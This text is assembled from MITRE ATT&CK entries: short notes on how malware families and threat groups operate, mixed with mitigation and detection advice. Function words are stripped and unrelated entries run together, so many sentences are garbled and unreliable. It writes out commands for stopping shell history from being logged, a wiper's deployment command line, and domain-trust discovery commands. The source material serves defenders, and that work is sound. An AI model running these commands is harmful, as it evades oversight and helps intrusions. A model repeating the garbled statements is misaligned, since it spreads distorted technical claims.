[CrackMapExec](https://attack.mitre.org/software/S0488) execute remote commands Windows Management Instrumentation.(Citation: CME Github September 2018)	 [Flagpro](https://attack.mitre.org/software/S0696) communicate C2 HTTP.(Citation: NTT Security Flagpro December 2021)  [FatDuke](https://attack.mitre.org/software/S0512) secure delete DLL.(Citation: ESET Dukes October 2019) [Ferocious](https://attack.mitre.org/software/S0679) hijacking establish persistence.(Citation: Kaspersky WIRTE November 2021) [Inception](https://attack.mitre.org/groups/G0100) file hunting plugin collect .txt, .pdf, .xls .doc files infected host.(Citation: Kaspersky Cloud Atlas August 2019) [SMOKEDHAM](https://attack.mitre.org/software/S0649) <code>whoami</code> commands identify owners.(Citation: FireEye SMOKEDHAM June 2021) [PittyTiger](https://attack.mitre.org/groups/G0011) tools [Mimikatz](https://attack.mitre.org/software/S0002) [gsecdump](https://attack.mitre.org/software/S0008).(Citation: Bizeul 2014) [UNC2452](https://attack.mitre.org/groups/G0118) acquired C2 domains resellers.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [GALLIUM](https://attack.mitre.org/groups/G0093) WinRAR compress encrypt stolen data prior exfiltration.(Citation: Cybereason Soft Cell June 2019)(Citation: GALLIUM December 2019) [APT30](https://attack.mitre.org/groups/G0013) spearphishing emails malicious DOC attachments.(Citation: FireEye APT30) [FIN6](https://attack.mitre.org/groups/G0037) malicious documents lure victims allowing execution PowerShell scripts.(Citation: Visa FIN6 Feb 2019) Restrict file shares specific directories access users. [LookBack](https://attack.mitre.org/software/S0582) desktop screenshots.(Citation: Proofpoint LookBack Malware Aug 2019) [gh0st RAT](https://attack.mitre.org/software/S0032) decrypted loaded [gh0st RAT](https://attack.mitre.org/software/S0032) DLL memory, initial dropper executable launched.(Citation: Gh0stRAT ATT March 2019) [Tropic Trooper](https://attack.mitre.org/groups/G0081) encrypted configuration files.(Citation: TrendMicro Tropic Trooper Mar 2018)(Citation: TrendMicro Tropic Trooper 2020) [Felismus](https://attack.mitre.org/software/S0171) checks processes anti-virus vendors.(Citation: Forcepoint Felismus Mar 2017) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level. Signatures unique indicators protocols based specific C2 protocol adversary tool, malware families versions. Adversaries change tool C2 signatures time construct protocols avoid detection common defensive tools.(Citation: University Birmingham C2) [Inception](https://attack.mitre.org/groups/G0100) malicious HTA files drop execute malware.(Citation: Kaspersky Cloud Atlas August 2019) [RTM](https://attack.mitre.org/software/S0148) POST requests data formatted custom protocol.(Citation: ESET RTM Feb 2017) Ensure safe DLL search mode enabled <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode</code> mitigate risk lsass.exe loads malicious code library. (Citation: DLL Security) Ensure event tracers/forwarders (Citation: ETW 2018), firewall policies, mechanisms secured permissions access controls. Monitor newly executed processes correlate software. Analyze process execution trees, historical activities third-party application (such types files pushed), activities events file/binary/script pushed systems.  Monitor queried domain (DNS) registry data hijack domains subdomains targeting. activity visibility target organization, detection behavior difficult. Detection efforts focused stages adversary lifecycle, Command Control. [Koadic](https://attack.mitre.org/software/S0250) interactive command-shell perform command functions victim machines. [Koadic](https://attack.mitre.org/software/S0250) performs operations Windows Script Host (Jscript) arbitrary shellcode.(Citation: Github Koadic)(Citation: MalwareBytes LazyScripter Feb 2021) [DropBook](https://attack.mitre.org/software/S0547) download execute additional files.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) Monitor common cryptomining files local systems compromise resource usage [Leafminer](https://attack.mitre.org/groups/G0077) tools retrieving login password information, including LaZagne.(Citation: Symantec Leafminer July 2018) endpoint security solutions configured block types behaviors process injection/memory tampering based common sequences indicators (ex: execution specific API functions). [SysUpdate](https://attack.mitre.org/software/S0663) encrypt encode configuration file.(Citation: Trend Micro Iron Tiger April 2021) [GALLIUM](https://attack.mitre.org/groups/G0093) PowerShell execution assist lateral movement dumping credentials stored compromised machines.(Citation: Cybereason Soft Cell June 2019) Limit permissions create symbolic links Windows Administrators virtualization. GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Create symbolic links. (Citation: UCF STIG Symbolic Links) Monitor executed commands arguments actions gather browser bookmark information. Remote access tools built-in features interact APIs gather information. acquired management tools Windows Management Instrumentation PowerShell. [HEXANE](https://attack.mitre.org/groups/G1001) acquired, customized, source tools [Mimikatz](https://attack.mitre.org/software/S0002), [Empire](https://attack.mitre.org/software/S0363), VNC remote access software, DIG.net.(Citation: Kaspersky Lyceum October 2021)(Citation: SecureWorks August 2019)(Citation: Zscaler Lyceum DnsSystem June 2022) [DRATzarus](https://attack.mitre.org/software/S0694) search machines connected compromised host attempt map network.(Citation: ClearSky Lazarus Aug 2020) [PlugX](https://attack.mitre.org/software/S0013) checks VMware tools running background searching process named "vmtoolsd".(Citation: Unit42 PlugX June 2017) [QUADAGENT](https://attack.mitre.org/software/S0269) PowerShell filenames <code>Office365DCOMCheck.ps1</code> <code>SystemDiskClean.ps1</code>.(Citation: Unit 42 QUADAGENT July 2018) [Helminth](https://attack.mitre.org/software/S0170) download additional files.(Citation: Palo Alto OilRig 2016) [Astaroth](https://attack.mitre.org/software/S0373) collects external IP address system. (Citation: Cofense Astaroth Sept 2018) [DnsSystem](https://attack.mitre.org/software/S1021) write Startup folder gain persistence.(Citation: Zscaler Lyceum DnsSystem June 2022) [Zebrocy](https://attack.mitre.org/software/S0251) searches files 60mb extensions: .doc, .docx, .xls, .xlsx, .ppt, .pptx, .exe, .zip, .rar. [Zebrocy](https://attack.mitre.org/software/S0251) runs <code>echo %APPDATA%</code> command list contents directory.(Citation: Securelist Sofacy Feb 2018)(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy 2019) [Zebrocy](https://attack.mitre.org/software/S0251) current execution path perform drive enumeration.(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: CISA Zebrocy Oct 2020)  [Gelsemium](https://attack.mitre.org/software/S0666) determine operating targeted machine 32 64 bit architecture.(Citation: ESET Gelsemium June 2021) [PcShare](https://attack.mitre.org/software/S1050) collect files compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) [Gamaredon Group](https://attack.mitre.org/groups/G0047) tools decrypted additional payloads C2. [Gamaredon Group](https://attack.mitre.org/groups/G0047) decoded base64-encoded source code downloader.(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020) [SideCopy](https://attack.mitre.org/groups/G1008) Office Publisher documents victims embedded malicious macros execute hta file calling `mshta.exe`.(Citation: MalwareBytes SideCopy Dec 2021) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. Configure SNMPv3 level security (authPriv) available.(Citation: US-CERT TA17-156A SNMP Abuse 2017) [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) enable Windows CLI access execute files.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Chrommme](https://attack.mitre.org/software/S0667) encrypt sections code evade detection.(Citation: ESET Gelsemium June 2021) [Valak](https://attack.mitre.org/software/S0476) downloaded variety modules payloads compromised host, including [IcedID](https://attack.mitre.org/software/S0483) NetSupport Manager RAT-based malware.(Citation: Unit 42 Valak July 2020)(Citation: Cybereason Valak 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors VBScript conduct reconnaissance targeted systems.(Citation: FoxIT Wocao December 2019) [LightNeuron](https://attack.mitre.org/software/S0395) AES encrypt C2 traffic.(Citation: ESET LightNeuron 2019) [WellMess](https://attack.mitre.org/software/S0514) Base64 encoding uniquely identify communication C2.(Citation: CISA WellMess July 2020) [LazyScripter](https://attack.mitre.org/groups/G0140) leveraged dynamic DNS providers C2 communications.(Citation: MalwareBytes LazyScripter Feb 2021)  [HermeticWiper](https://attack.mitre.org/software/S0697) `cmd.exe /Q/c CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1> \\127.0.0.1\ADMIN$\_1636727589.6007507 2>&1` deploy infected system.(Citation: ESET Hermetic Wizard March 2022) [Machete](https://attack.mitre.org/software/S0409) captures audio computer’s microphone.(Citation: Securelist Machete Aug 2014)(Citation: Cylance Machete Mar 2017)(Citation: 360 Machete Sep 2020) Periodically baseline cloud block storage volumes identify malicious modifications additions. UAC bypass techniques exist, prudent enforcement level UAC mitigate bypass opportunities exist techniques [DLL Search Hijacking](https://attack.mitre.org/techniques/T1574/001). [Gazer](https://attack.mitre.org/software/S0168) performs thread execution hijacking inject orchestrator running thread remote process.(Citation: ESET Gazer Aug 2017)(Citation: Securelist WhiteBear Aug 2017) Monitor publicly writeable directories, central locations, commonly staging directories (recycle bin, temp folders, etc.) regularly check compressed encrypted data indicative staging. [Mongall](https://attack.mitre.org/software/S1026) ability upload files victim's machines.(Citation: SentinelOne Aoqin Dragon June 2022) (Citation: FireEye APT40 March 2019) Administrators audit cloud container accounts ensure permissions granted appropriate. possible, ability request temporary account tokens behalf accounts disabled. Additionally, administrators leverage audit tools monitor actions conducted result OAuth 2.0 access. instance, audit reports enable admins identify privilege escalation actions role creations policy modifications, actions performed initial access. [APT37](https://attack.mitre.org/groups/G0067) injects malware variant, [ROKRAT](https://attack.mitre.org/software/S0240), cmd.exe process.(Citation: Talos Group123) [FunnyDream](https://attack.mitre.org/campaigns/C0007), threat actors `cmd.exe` execute wmiexec.vbs script.(Citation: Bitdefender FunnyDream Campaign November 2020) [MacMa](https://attack.mitre.org/software/S1016) dump credentials macOS keychain.(Citation: ESET DazzleSpy Jan 2022) [SpeakUp](https://attack.mitre.org/software/S0374) deletes files remove evidence machine. (Citation: CheckPoint SpeakUp Feb 2019) [MarkiRAT](https://attack.mitre.org/software/S0652) exfiltrate locally stored data C2.(Citation: Kaspersky Ferocious Kitten Jun 2021) [LoudMiner](https://attack.mitre.org/software/S0451) typically bundled pirated copies Virtual Studio Technology (VST) Windows macOS.(Citation: ESET LoudMiner June 2019) [APT38](https://attack.mitre.org/groups/G0082) attempted detailed compromised host, including operating system, version, patches, hotfixes, service packs.(Citation: CISA AA20-239A BeagleBoyz August 2020) [Egregor](https://attack.mitre.org/software/S0554) ability download files C2 server.(Citation: Cybereason Egregor Nov 2020)(Citation: Intrinsec Egregor Nov 2020) Windows 8.1 Windows Server 2012 R2, enable Protected Process Light LSA.(Citation: LSA) [KONNI](https://attack.mitre.org/software/S0356) download files execute victim’s machine.(Citation: Talos Konni 2017)(Citation: Malwarebytes Konni Aug 2021)  Monitor logs review instance activities occurring cloud environments regions. [Netwalker](https://attack.mitre.org/software/S0457)'s PowerShell script obfuscated multiple layers including base64 hexadecimal encoding XOR-encryption, obfuscated PowerShell functions variables. [Netwalker](https://attack.mitre.org/software/S0457)'s DLL embedded PowerShell script hex format.(Citation: TrendMicro Netwalker 2020)(Citation: Sophos Netwalker 2020) [CharmPower](https://attack.mitre.org/software/S0674) PowerShell payload execution C2 communication.(Citation: Check APT35 CharmPower January 2022) Allowlist MIB objects implement SNMP views.(Citation: Cisco Securing SNMP) [Empire](https://attack.mitre.org/software/S0363) perform pass hash attacks.(Citation: Github PowerShell Empire) [yty](https://attack.mitre.org/software/S0248) collects victim’s username.(Citation: ASERT Donot March 2018) [Netwalker](https://attack.mitre.org/software/S0457) delete infected system's Shadow Volumes prevent recovery.(Citation: TrendMicro Netwalker 2020)(Citation: Sophos Netwalker 2020) [Clambling](https://attack.mitre.org/software/S0660) cmd.exe command execution.(Citation: Trend Micro DRBControl February 2020) [APT41](https://attack.mitre.org/groups/G0096) DNS C2 communications.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021)  [SILENTTRINITY](https://attack.mitre.org/software/S0692) written Python multiple Python scripts execution targeted systems.(Citation: GitHub SILENTTRINITY March 2022)(Citation: GitHub SILENTTRINITY Modules July 2019) [KARAE](https://attack.mitre.org/software/S0215) collect information.(Citation: FireEye APT37 Feb 2018) [Okrum](https://attack.mitre.org/software/S0439) impersonate logged-on user's security context ImpersonateLoggedOnUser API.(Citation: ESET Okrum July 2019) [Explosive](https://attack.mitre.org/software/S0569) encrypted communications RC4 method.(Citation: ClearSky Lebanese Cedar Jan 2021)  Ensure root accounts complex, unique passwords systems network. Monitor proxied smart card connections adversary difficult requires token inserted system; legitimate user blend network behavior. to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity forms detected installation driver. Monitor newly executed processes attempt gather attached peripheral devices components connected system. [RTM](https://attack.mitre.org/software/S0148) named scheduled task creates "Windows Update".(Citation: Unit42 Redaman January 2019) [PROMETHIUM](https://attack.mitre.org/groups/G0056) created services modified existing services persistence.(Citation: Bitdefender StrongPity June 2020) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [TrickBot](https://attack.mitre.org/software/S0266) disable Windows Defender.(Citation: Trend Micro Trickbot Nov 2018) multiple methods preventing user's command history flushed .bash_history file, including commands:
<code>set +o history</code> <code>set -o history</code> start logging again;
<code>unset HISTFILE</code> user's .bash_rc file; and
<code>ln -s /dev/null ~/.bash_history</code> write commands <code>/dev/null</code>instead. Enforce registration execution legitimately signed service drivers possible. Windows 10, enable Attack Surface Reduction (ASR) rules prevent [Visual Basic](https://attack.mitre.org/techniques/T1059/005) scripts executing malicious downloaded content (Citation: win10_asr). [BackConfig](https://attack.mitre.org/software/S0475) ability gather victim's name.(Citation: Unit 42 BackConfig 2020) [Bankshot](https://attack.mitre.org/software/S0239) recursively generates list files directory sends control server.(Citation: McAfee Bankshot) [OSInfo](https://attack.mitre.org/software/S0165) performs connection discover remote systems network(Citation: Symantec Buckeye) [Silent Librarian](https://attack.mitre.org/groups/G0122) collected e-mail addresses targeted organizations Internet searches.(Citation: DOJ Iran Indictments March 2018) patch management process implemented check unused dependencies, unmaintained vulnerable dependencies, unnecessary features, components, files, documentation. [Sandworm Team](https://attack.mitre.org/groups/G0034) tricked unwitting recipients clicking malicious hyperlinks emails crafted resemble trustworthy senders.(Citation: District Court Indictment GRU Unit 74455 October 2020) [Chaes](https://attack.mitre.org/software/S0631) Python scripts execution installation additional files.(Citation: Cybereason Chaes Nov 2020)  Monitor files attempt hide artifacts behaviors evade detection. Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. (Citation: NEODYMIUM Dec 2016)(Citation: SIR 21) Monitor contextual data service/daemon, include name, service executable, start type, etc. [EVILNUM](https://attack.mitre.org/software/S0568) harvest cookies upload C2 server.(Citation: Prevailion EvilNum 2020) [ShadowPad](https://attack.mitre.org/software/S0596) collected domain victim system.(Citation: Kaspersky ShadowPad Aug 2017) (Citation: MalwareBytes LazyScripter Feb 2021) [Meteor](https://attack.mitre.org/software/S0688) PowerShell commands disable network adapters victim machines.(Citation: Check Meteor Aug 2021) [BBSRAT](https://attack.mitre.org/software/S0127) persisting hijacking replacement object MruPidlList <code>{42aedc87-2188-41fd-b9a3-0c966feabec1}</code> WBEM Event Subsystem <code>{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}</code> depending system's CPU architecture.(Citation: Palo Alto Networks BBSRAT) (Citation: Operation Quantum Entanglement) [LightNeuron](https://attack.mitre.org/software/S0395) store email data files directories configuration, <code>C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\</code>.(Citation: ESET LightNeuron 2019) [Ramsay](https://attack.mitre.org/software/S0458) data embedded JPEG files contained Word documents.(Citation: Antiy CERT Ramsay April 2020) [HermeticWiper](https://attack.mitre.org/software/S0697) determine OS version, bitness, enumerate physical drives targeted host.(Citation: SentinelOne Hermetic Wiper February 2022)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wizard March 2022)(Citation: Qualys Hermetic Wiper March 2022) [Astaroth](https://attack.mitre.org/software/S0373) create process suspended targeted legitimate process unmap memory replace malicious code.(Citation: Cybereason Astaroth Feb 2019)(Citation: Securelist Brazilian Banking Malware July 2020) [PowerLess](https://attack.mitre.org/software/S1012) stage stolen browser data `C:\\Windows\\Temp\\cup.tmp` keylogger data `C:\\Windows\\Temp\\Report.06E17A5A-7325-4325-8E5D-E172EBA7FC5BK`.(Citation: Cybereason PowerLess February 2022) Block unknown unused attachments default transmitted email practice prevent vectors, .scr, .exe, .pif, .cpl, etc. email scanning devices analyze compressed encrypted formats, zip rar conceal malicious attachments [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027). [OopsIE](https://attack.mitre.org/software/S0264) compresses collected files simple character replacement scheme sending C2 server.(Citation: Unit 42 OopsIE! Feb 2018) [Machete](https://attack.mitre.org/software/S0409) Command & Control.(Citation: ESET Machete July 2019)(Citation: Cylance Machete Mar 2017)(Citation: 360 Machete Sep 2020) [PowerPunch](https://attack.mitre.org/software/S0685) download payloads adversary infrastructure.(Citation: Actinium February 2022) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover time <code>net time</code> command.(Citation: Kaspersky Turla) [Magic Hound](https://attack.mitre.org/groups/G0059) malware list victim's logical drives type, total/free space fixed devices. malware list directory's contents.(Citation: Unit 42 Magic Hound Feb 2017) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), stage downloader resolved Windows libraries APIs, including `LoadLibraryA()`, `GetProcAddress()`, `CreateProcessA()`.(Citation: McAfee Sharpshooter December 2018) [FIN6](https://attack.mitre.org/groups/G0037) renamed "psexec" service "mstdc" masquerade legitimate Windows service.(Citation: FireEye FIN6 Apr 2019)	 [Comnie](https://attack.mitre.org/software/S0244) executes VBS scripts.(Citation: Palo Alto Comnie) [Attor](https://attack.mitre.org/software/S0438)'s dispatcher establish persistence registering service.(Citation: ESET Attor Oct 2019) [Ngrok](https://attack.mitre.org/software/S0508) provide DGA C2 servers random URL strings change 12 hours.(Citation: Zdnet Ngrok September 2018) Monitor newly constructed services/daemons carry malicious operations virtual instance avoid detection. monitoring [Windows Service](https://attack.mitre.org/techniques/T1543/003), respect virtualization software. [SilverTerrier](https://attack.mitre.org/groups/G0083) C2 communications.(Citation: Unit42 SilverTerrier 2018)	 Monitor DLL loads processes load user32.dll DLLs recognized loaded process. Monitor unexpected process interactions Windows Registry reads) gathering information. [APT3](https://attack.mitre.org/groups/G0022) stage files exfiltration single location.(Citation: aptsim) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. initial beacon packet [Misdat](https://attack.mitre.org/software/S0083) operating version victim.(Citation: Cylance Dust Storm) [Nebulae](https://attack.mitre.org/software/S0630) created service named "Windows Update Agent1" legitimate.(Citation: Bitdefender Naikon April 2021) [Shark](https://attack.mitre.org/software/S1019) execution screen targeted machine 600 pixels.(Citation: ClearSky Siamesekitten August 2021) [RATANKBA](https://attack.mitre.org/software/S0241) lists system’s processes.(Citation: Lazarus RATANKBA)(Citation: RATANKBA) [MacSpy](https://attack.mitre.org/software/S0282) stores <code>~/Library/.DS_Stores/</code> (Citation: alientvault macspy) [P.A.S. Webshell](https://attack.mitre.org/software/S0598) list PHP server configuration details.(Citation: ANSSI Sandworm January 2021) [SILENTTRINITY](https://attack.mitre.org/software/S0692) scan ports compromised machine.(Citation: GitHub SILENTTRINITY Modules July 2019) (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) implants [APT28](https://attack.mitre.org/groups/G0007), [CHOPSTICK](https://attack.mitre.org/software/S0023), blend HTTP, HTTPS, legitimate channels C2, depending module configuration.(Citation: FireEye APT28)(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [RTM](https://attack.mitre.org/software/S0148) encrypts C2 traffic custom RC4 variant.(Citation: ESET RTM Feb 2017) application control appropriate. Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent. [Gorgon Group](https://attack.mitre.org/groups/G0078) malware download remote access tool, [ShiftyBug](https://attack.mitre.org/software/S0294), inject process.(Citation: Unit 42 Gorgon Aug 2018) [Moses Staff](https://attack.mitre.org/groups/G1009) dropped compromised system.(Citation: Checkpoint MosesStaff Nov 2021) [PipeMon](https://attack.mitre.org/software/S0501) installer UAC bypass techniques install payload.(Citation: ESET PipeMon 2020) [Windshift](https://attack.mitre.org/groups/G0112) spearphishing emails links harvest credentials deliver malware.(Citation: SANS Windshift August 2018) [Mustang Panda](https://attack.mitre.org/groups/G0129) <code>tasklist /v</code> determine active process information.(Citation: Avira Mustang Panda January 2020)	 [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) legitimate applications side-load malicious DLLs.(Citation: Trend Micro Tick November 2019) [Ramsay](https://attack.mitre.org/software/S0458) masqueraded 7zip installer.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [Mustang Panda](https://attack.mitre.org/groups/G0129) gathered <code>systeminfo</code>.(Citation: Avira Mustang Panda January 2020) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors Visual Basic script checked internet connectivity.(Citation: FoxIT Wocao December 2019) [APT18](https://attack.mitre.org/groups/G0026) upload file victim’s machine.(Citation: PaloAlto DNS Requests 2016) [Emotet](https://attack.mitre.org/software/S0367) Word documents embedded macros invoke scripts download additional payloads. (Citation: Symantec Emotet Jul 2018)(Citation: Talos Emotet Jan 2019)(Citation: Trend Micro Emotet Jan 2019)(Citation: Picus Emotet Dec 2018)(Citation: Carbon Black Emotet Apr 2019) [KeyBoy](https://attack.mitre.org/software/S0387) download upload functionality.(Citation: PWC KeyBoys Feb 2017)(Citation: Rapid7 KeyBoy Jun 2013) [SILENTTRINITY](https://attack.mitre.org/software/S0692) PowerShell execute commands.(Citation: GitHub SILENTTRINITY Modules July 2019) [APT41](https://attack.mitre.org/groups/G0096) malware variant called WIDETONE conduct port scans subnets.(Citation: FireEye APT41 Aug 2019) [MirageFox](https://attack.mitre.org/software/S0280) loaded DLL hijacking legitimate McAfee binary.(Citation: APT15 Intezer June 2018) [Zebrocy](https://attack.mitre.org/software/S0251) creates entry Registry key malware execute startup.(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy 2019)(Citation: Accenture SNAKEMACKEREL Nov 2018) [Spark](https://attack.mitre.org/software/S0543) splash screen check user actively clicks screen running malicious code.(Citation: Unit42 Molerat Mar 2020)  [Lazarus Group](https://attack.mitre.org/groups/G0032) lnk files persistence abused Windows Update Client (<code>wuauclt.exe</code>) execute malicious DLL.(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [PLEAD](https://attack.mitre.org/software/S0435) ability list drives files compromised host.(Citation: TrendMicro BlackTech June 2017)(Citation: JPCert PLEAD Downloader June 2018) [BADCALL](https://attack.mitre.org/software/S0245) collects host compromised system.(Citation: US-CERT BADCALL) [Empire](https://attack.mitre.org/software/S0363) ability gather browser data bookmarks visited sites.(Citation: Github PowerShell Empire) [Industroyer](https://attack.mitre.org/software/S0604)’s data wiper module writes zeros registry <code>SYSTEM\CurrentControlSet\Services</code> render inoperable.(Citation: Dragos Crashoverride 2017) Applications appliances utilize default username password changed installation, deployment production environment. (Citation: US-CERT Alert TA13-175A Risks Default Passwords Internet) Require MFA delegated administrator accounts.(Citation: Nobelium Admin Privileges) Limit privileges user accounts authorized privileged users create modify XDG autostart entries.  [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) capture screenshots store locally.(Citation: CISA EB Aug 2020) [Pupy](https://attack.mitre.org/software/S0192) module checks indicators determine running virtual machine.(Citation: GitHub Pupy) (Citation: Spring Dragon Jun 2015)(Citation: Accenture Dragonfish Jan 2018) [Saint Bot](https://attack.mitre.org/software/S1018) `is_debugger_present` environmental checks.(Citation: Malwarebytes Saint Bot April 2021) Monitor executed commands arguments folders drives shared remote systems identifying sources gather precursor Collection identify potential systems Lateral Movement. [Bundlore](https://attack.mitre.org/software/S0482) obfuscated data base64, AES, RC4, bz2.(Citation: MacKeeper Bundlore Apr 2019) [HAFNIUM](https://attack.mitre.org/groups/G0125) shells export mailbox data.(Citation: HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021) [MuddyWater](https://attack.mitre.org/groups/G0069) tools including Browser64 steal passwords saved victim browsers.(Citation: Symantec MuddyWater Dec 2018)(Citation: Trend Micro Muddy Water March 2021) [APT32](https://attack.mitre.org/groups/G0050) cleared select event log entries.(Citation: FireEye APT32 2017) [APT1](https://attack.mitre.org/groups/G0006) <code>net use</code> command listing network connections.(Citation: Mandiant APT1) Binaries baselined dynamic libraries require, app requires dynamic library wasn\u2019t included update, investigated. Ensure private stored securely locations legitimate owner access strong passwords rotated frequently. [Naikon](https://attack.mitre.org/groups/G0019) renamed malicious service <code>taskmgr</code> legitimate version Task Manager.(Citation: Bitdefender Naikon April 2021) [Cardinal RAT](https://attack.mitre.org/software/S0348) watchdog functionality periodically ensures <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load</code> set executable.(Citation: PaloAlto CardinalRat Apr 2017) [QakBot](https://attack.mitre.org/software/S0650) <code>nltest /domain_trusts /all_trusts</code> domain trust discovery.(Citation: Kaspersky QakBot September 2021) [TrickBot](https://attack.mitre.org/software/S0266) identify user compromised host belongs to.(Citation: Cyberreason Anchor December 2019) [Cobalt Group](https://attack.mitre.org/groups/G0080) deleted DLL dropper victim’s machine cover tracks.(Citation: Talos Cobalt July 2018) [Leviathan](https://attack.mitre.org/groups/G0065) VBScript.(Citation: Proofpoint Leviathan Oct 2017) proxies enforce external network communication policy prevents unauthorized external services. Monitor files modify kernel automatically execute programs boot. Refer NIST guidelines creating password policies. (Citation: NIST 800-63-3) Monitor executed commands arguments existing, legitimate external service exfiltrate data primary command control channel. [Stolen Pencil](https://attack.mitre.org/groups/G0086) tool sniff network passwords. (Citation: Netscout Stolen Pencil Dec 2018) [Torisma](https://attack.mitre.org/software/S0678) HTTPS C2 communications.(Citation: McAfee Lazarus Nov 2020) [Bisonal](https://attack.mitre.org/software/S0268) checked malware running virtual environment anti-debug function GetTickCount() compare timing.(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020)  [Turla](https://attack.mitre.org/groups/G0010) valid digital certificates Sysprint sign [Epic](https://attack.mitre.org/software/S0091) dropper.(Citation: Kaspersky Turla) [Kazuar](https://attack.mitre.org/software/S0265) install service.(Citation: Unit 42 Kazuar 2017) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors command script set persistence scheduled task named "WinUpdate", encoded commands command-line (Citation: Talos Frankenstein June 2019) (Citation: Trend Micro DRBControl February 2020) [Magic Hound](https://attack.mitre.org/groups/G0059) malware gathers victim's local IP address, MAC address, external IP address.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: DFIR Report APT35 ProxyShell March 2022) Monitor unexpected usage syscalls as `mount` that attempt escape privileged container host.  [SDBbot](https://attack.mitre.org/software/S0461) ability record video compromised host.(Citation: Proofpoint TA505 October 2019)(Citation: IBM TA505 April 2020) [OceanSalt](https://attack.mitre.org/software/S0346) collect system.(Citation: McAfee Oceansalt Oct 2018) [Waterbear](https://attack.mitre.org/software/S0579) API hooks `GetExtendedTcpTable` retrieve table list TCP endpoints application.(Citation: Trend Micro Waterbear December 2019)  [EXOTIC LILY](https://attack.mitre.org/groups/G1011) created e-mail accounts spoof targeted organizations.(Citation: Google EXOTIC LILY March 2022) Monitor Windows Registry values services startup programs correspond security tools HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender. [UNC2452](https://attack.mitre.org/groups/G0118) PowerShell create tasks remote machines, identify configuration settings, exfiltrate data, execute commands.(Citation: Volexity SolarWinds)(Citation: Analyzing Solorigate Dec 2020) [P8RAT](https://attack.mitre.org/software/S0626) check compromised host processes VMware VirtualBox environments.(Citation: Securelist APT10 March 2021) [Transparent Tribe](https://attack.mitre.org/groups/G0134) hide legitimate directories replace malicious copies name.(Citation: Kaspersky Transparent Tribe August 2020) Monitor newly executed processes account creation, net.exe Monitor services Launch Daemons execute malicious payloads persistence. establish persistence, [SslMM](https://attack.mitre.org/software/S0058) identifies Start Menu Startup directory drops link executable disguised “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” “MSN Talk” shortcut.(Citation: Baumgartner Naikon 2015) [Indrik Spider](https://attack.mitre.org/groups/G0119) batch scripts victim's machines.(Citation: Crowdstrike Indrik November 2018)  [Dtrack](https://attack.mitre.org/software/S0567) process hollowing shellcode target predefined list processes <code>%SYSTEM32%</code>.(Citation: Securelist Dtrack) [Silence](https://attack.mitre.org/groups/G0091) ProxyBot, attacker redirect traffic current node backconnect server Sock4\Socks5.(Citation: IB Silence Sept 2018)	 [Cobian RAT](https://attack.mitre.org/software/S0338) feature perform keylogging victim’s machine.(Citation: Zscaler Cobian Aug 2017) [Okrum](https://attack.mitre.org/software/S0439) DriveLetterView enumerate drive information.(Citation: ESET Okrum July 2019) [jRAT](https://attack.mitre.org/software/S0283) capture passwords common browsers Internet Explorer, Google Chrome, Firefox.(Citation: Kaspersky Adwind Feb 2016) (Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: NCSC GCHQ Sieve Jan 2022) [Agent Tesla](https://attack.mitre.org/software/S0331) log keystrokes victim’s machine.(Citation: Talos Agent Tesla Oct 2018)(Citation: DigiTrust Agent Tesla Jan 2017)(Citation: Fortinet Agent Tesla June 2017)(Citation: Bitdefender Agent Tesla April 2020)(Citation: SentinelLabs Agent Tesla Aug 2020) monitoring accesses modifications local storage repositories (such Windows Registry), suspicious processes malicious data collection. [Patchwork](https://attack.mitre.org/groups/G0040) payload packed UPX.(Citation: Securelist Dropping Elephant) Prevent credential overlap systems administrator privileged accounts. (Citation: FireEye WMI 2015) 